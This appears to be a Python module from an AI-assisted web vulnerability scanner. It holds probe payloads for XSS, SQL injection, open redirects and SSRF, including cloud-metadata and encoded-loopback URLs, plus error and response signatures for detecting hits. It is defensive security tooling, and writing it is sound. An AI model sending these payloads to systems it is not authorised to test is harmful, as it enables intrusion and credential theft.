"""Deterministic payload sets and detection signatures.

Used by the probe tools (M3) and reusable by the LLM hunter sessions. Payloads
are intentionally minimal: detection + harmless PoC only — nothing destructive,
no data exfiltration, no DoS-shaped input.
"""
from __future__ import annotations

import uuid

# ---------------------------------------------------------------------- XSS

XSS_PROBES = [
    # marker is echoed verbatim => reflection point confirmed
    '"><script>{marker}</script>',
    "'><script>{marker}</script>",
    '<img src=x onerror="{marker}">',
    '"><svg onload="{marker}">',
    "{{7*7}}",  # template injection side-check: 49 means SSTI
]

# ---------------------------------------------------------------------- SQLi

SQLI_PROBES = [
    ("' OR '1'='1", "auth bypass / boolean error"),
    ("' OR '1'='2", "control for the above"),
    ("'", "syntax error signature"),
    ("1' ORDER BY 100-- -", "column-count error signature"),
    ("1 UNION SELECT NULL-- -", "union probe"),
    ("1 AND 1=1", "boolean true"),
    ("1 AND 1=2", "boolean false (differential pair)"),
]

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: sqlite",
    "sqlite3.operationalerror",
    "sqlite_exception",
    "unrecognized token",          # sqlite tokenizer errors on broken quotes
    "unmatched quotation mark",
    "incomplete input",
    "unterminated quoted string",
    "pg_query()", "psql:", "postgresql",
    "mysql_fetch", "mysqli", "ora-01756", "oracle error",
    "sqlsyntaxerrorexception", "sql server", "odbc", "ole db",
    "unclosed quotation mark", "quoted string not properly terminated",
]

# ------------------------------------------------------------------- redirects

REDIRECT_PAYLOADS = [
    "https://oob-example.invalid",          # absolute, obviously not theirs
    "//oob-example.invalid",                # protocol-relative
    "/\\oob-example.invalid",               # backslash confusion
    "https://trusted.example.target.path@oob-example.invalid/",  # userinfo trick
]

# ------------------------------------------------------------------------ SSRF

SSRF_PAYLOADS = [
    ("http://127.0.0.1:{port}/", "loopback"),
    ("http://localhost:{port}/", "localhost alias"),
    ("http://169.254.169.254/latest/meta-data/", "cloud metadata (AWS/GCP)"),
    ("http://169.254.169.254/metadata/instance", "cloud metadata (Azure)"),
    ("http://[::1]:{port}/", "ipv6 loopback"),
    ("http://0x7f000001:{port}/", "hex-encoded loopback"),
    ("http://017700000001:{port}/", "octal-encoded loopback"),
    ("http://2130706433:{port}/", "decimal-encoded loopback"),
    ("http://127.1:{port}/", "short loopback"),
    ("http://internal-host.invalid/", "internal dns probe"),
]

SSRF_BODY_MARKERS = [
    "ami-id", "iam/security-credentials",  # AWS metadata body
    "computeMetadata",                       # GCP
    "Welcome to nginx", "Apache2 Default Page",  # internal services
]

# ---------------------------------------------------------------------- IDOR

IDOR_HINTS = [
    "/api/user/", "/api/users/", "/api/account/", "/api/orders/",
    "/api/invoice", "/api/profile", "/api/documents", "/api/messages",
]


def fresh_marker() -> str:
    """Unique, URL-safe marker token for one probe round."""
    return "x" + uuid.uuid4().hex[:10]


def find_error_signatures(text: str) -> list[str]:
    lowered = text.lower()
    return [s for s in SQL_ERROR_SIGNATURES if s in lowered]
